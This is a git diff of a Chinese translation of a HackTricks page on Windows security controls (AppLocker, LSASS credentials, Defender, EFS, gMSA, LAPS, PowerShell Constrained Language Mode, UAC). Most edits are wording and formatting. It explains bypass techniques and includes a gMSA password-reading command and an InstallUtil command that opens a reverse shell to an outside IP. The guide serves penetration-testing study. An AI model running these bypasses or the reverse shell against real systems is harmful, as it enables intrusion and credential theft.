@@ -9,14 +9,14 @@
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和**自动化工作流程**，并由全球**最先进的**社区工具提供支持。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，并由全球**最先进的**社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -41,8 +41,7 @@ $a.rulecollections
 ```
 这个注册表路径包含了AppLocker应用的配置和策略，提供了一种查看系统上当前生效规则集的方式：
 
-- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
-
+* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 ### 绕过
 
@@ -55,9 +54,9 @@ C:\windows\tracing
 ```
 * 通常**受信任的**[**"LOLBAS's"**](https://lolbas-project.github.io/)二进制文件也可以用于绕过AppLocker。
 * **编写不良的规则也可能被绕过**
-* 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个名为`allowed`的**文件夹**，它将被允许。
-* 组织通常也会专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忽略了**其他**[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)，如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
-* **很少启用DLL强制执行**，因为它可能会给系统带来额外的负担，并且需要大量测试来确保不会出现问题。因此，使用**DLL作为后门将有助于绕过AppLocker**。
+* 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>**，您可以在任何地方创建一个名为`allowed`的**文件夹**，它将被允许。
+* 组织通常也会专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忽略了**其他**[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) ，如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
+* **DLL强制执行很少启用**，因为它可能会给系统带来额外的负担，并且需要大量测试来确保不会出现问题。因此，使用**DLL作为后门将有助于绕过AppLocker**。
 * 您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)在任何进程中**执行Powershell**代码并绕过AppLocker。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## 凭据存储
@@ -70,9 +69,9 @@ C:\windows\tracing
 
 **凭据**（哈希）被**保存**在此子系统的**内存**中，用于单点登录。\
 **LSA**管理本地**安全策略**（密码策略，用户权限...），**身份验证**，**访问令牌**...\
-LSA将**检查**提供的凭据是否在**SAM**文件中（用于本地登录），并与**域控制器**通信以验证域用户。
+LSA将会**检查**提供的凭据是否在**SAM**文件中（用于本地登录），并与**域控制器**通信以验证域用户。
 
-**凭据**保存在**LSASS进程**中：Kerberos票证，哈希NT和LM，易于解密的密码。
+**凭据**被**保存**在**LSASS进程**中：Kerberos票据，NT和LM哈希，易于解密的密码。
 
 ### LSA秘密
 
@@ -89,11 +88,11 @@ LSA可能会在磁盘中保存一些凭据：
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是Windows 10和Windows 11以及Windows Server版本中可用的防病毒软件。它**阻止**常见的渗透测试工具，如**`WinPEAS`**。但是，有方法可以**绕过这些保护**。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是Windows 10和Windows 11中可用的防病毒软件，也适用于Windows Server的某些版本。它**阻止**常见的渗透测试工具，如**`WinPEAS`**。但是，有方法可以**绕过这些保护**。
 
 ### 检查
 
-要检查**Defender**的**状态**，您可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否已激活）： 
+要检查**Defender**的**状态**，您可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否已激活）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -112,7 +111,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-您还可以运行以下命令来枚举它：
+您还可以运行以下内容进行枚举：
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -123,18 +122,19 @@ sc query windefend
 ```
 ## 加密文件系统（EFS）
 
-EFS通过加密来保护文件，利用称为**文件加密密钥（FEK）**的**对称密钥**。该密钥使用用户的**公钥**加密，并存储在加密文件的$EFS **备用数据流**中。需要解密时，用户的数字证书对应的**私钥**用于从$EFS流中解密FEK。更多详细信息可在[此处](https://en.wikipedia.org/wiki/Encrypting_File_System)找到。
+EFS通过加密来保护文件，利用称为**文件加密密钥（FEK）**的**对称密钥**。该密钥使用用户的**公钥**加密，并存储在加密文件的$EFS **备用数据流**中。需要解密时，用户的数字证书对应的**私钥**用于从$EFS流中解密FEK。更多详细信息可在[此处](https://en.wikipedia.org/wiki/Encrypting\_File\_System)找到。
 
 **无需用户启动的解密场景**包括：
 
-- 当文件或文件夹移动到非EFS文件系统（如[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
+- 当文件或文件夹移动到非EFS文件系统（如[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)）时，它们会自动解密。
 - 通过SMB/CIFS协议发送的加密文件在传输之前会被解密。
 
 这种加密方法允许所有者**透明访问**加密文件。然而，仅仅更改所有者的密码并登录将不允许解密。
 
 **要点**：
+
 - EFS使用对称FEK，使用用户的公钥加密。
-- 解密需要用户的私钥来访问FEK。
+- 解密使用用户的私钥访问FEK。
 - 在特定条件下会自动解密，如复制到FAT32或网络传输。
 - 所有者可以访问加密文件而无需额外步骤。
 
@@ -142,7 +142,7 @@ EFS通过加密来保护文件，利用称为**文件加密密钥（FEK）**的*
 
 检查**用户**是否**使用**了此**服务**，检查路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-使用`cipher /c \<file\>`检查文件的**访问权限**。您还可以在文件夹中使用`cipher /e`和`cipher /d`来**加密**和**解密**所有文件。
+使用`cipher /c \<file>`检查文件的**访问权限**。您还可以在文件夹中使用`cipher /e`和`cipher /d`来**加密**和**解密**所有文件。
 
 ### 解密EFS文件
 
@@ -164,27 +164,27 @@ EFS通过加密来保护文件，利用称为**文件加密密钥（FEK）**的*
 - **定时任务功能**：与托管服务帐户不同，gMSA支持运行定时任务。
 - **简化的SPN管理**：当计算机的sAMaccount详细信息或DNS名称发生变化时，系统会自动更新服务主体名称（SPN），简化了SPN管理。
 
-gMSA的密码存储在LDAP属性_**msDS-ManagedPassword**_中，并且每30天由域控制器（DCs）自动重置。这个密码，一个被加密的数据块，称为[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能被授权管理员和安装了gMSA的服务器检索，确保了一个安全的环境。要访问这些信息，需要一个安全连接，如LDAPS，或者连接必须经过“密封和安全”认证。
+gMSA的密码存储在LDAP属性_**msDS-ManagedPassword**_中，并且每30天由域控制器（DCs）自动重置。这个密码是一个加密的数据块，称为[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装了gMSA的服务器检索，确保了一个安全的环境。要访问这些信息，需要一个安全连接，如LDAPS，或者连接必须经过“密封和安全”认证。
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
-您可以使用[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**：**
+您可以使用[GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)来读取这个密码。
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-**[在此帖子中查找更多信息](https://cube0x0.github.io/Relaying-for-gMSA/)**
+[**在此帖子中查找更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-另外，请查看这个关于如何执行**NTLM中继攻击**以**读取** **gMSA** **密码**的[网页](https://cube0x0.github.io/Relaying-for-gMSA/)。
+还可以查看这个关于如何执行**NTLM中继攻击**以**读取** **gMSA** **密码**的[网页](https://cube0x0.github.io/Relaying-for-gMSA/)。
 
 ## LAPS
 
-**本地管理员密码解决方案（LAPS）**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，可管理本地管理员密码。这些密码是**随机的**、独特的，并且**定期更改**，存储在Active Directory中。通过ACL对授权用户进行限制，可以提供读取本地管理员密码的能力。
+**本地管理员密码解决方案（LAPS）**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，可管理本地管理员密码。这些密码是**随机的**、独特的，并且**定期更改**，存储在Active Directory中。通过ACL对授权用户进行限制访问这些密码。在授予足够权限的情况下，可以读取本地管理员密码。
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
 {% endcontent-ref %}
 
-## PS Constrained Language Mode
+## PS 受限语言模式
 
 PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **限制了许多**有效使用PowerShell所需的功能，如阻止COM对象，仅允许批准的.NET类型，基于XAML的工作流程，PowerShell类等。
 
@@ -198,7 +198,7 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-在当前的Windows系统中，绕过（Bypass）不起作用，但可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
+在当前的Windows中，绕过（Bypass）不起作用，但你可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
 **要编译它，您可能需要** **添加引用** -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为 .Net4.5**。
 
 #### 直接绕过：
@@ -209,7 +209,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)来在任何进程中执行Powershell代码并绕过受限模式。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
+您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)来在任何进程中执行Powershell代码并绕过受限模式。欲了解更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## PS执行策略
 
@@ -254,7 +254,7 @@ SSPI将负责找到两台想要通信的机器的适当协议。首选方法是K
 * **Negotiate**：用于协商要使用的协议（Kerberos或NTLM，Kerberos是默认值）
 * %windir%\Windows\System32\lsasrv.dll
 
-#### 协商可以提供多种方法或仅一种。
+#### 协商可能提供多种方法或仅一种。
 
 ## UAC - 用户账户控制
 
@@ -264,7 +264,7 @@ SSPI将负责找到两台想要通信的机器的适当协议。首选方法是K
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具驱动。\
@@ -282,8 +282,8 @@ SSPI将负责找到两台想要通信的机器的适当协议。首选方法是K
 
 * 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS＆HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我们。
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
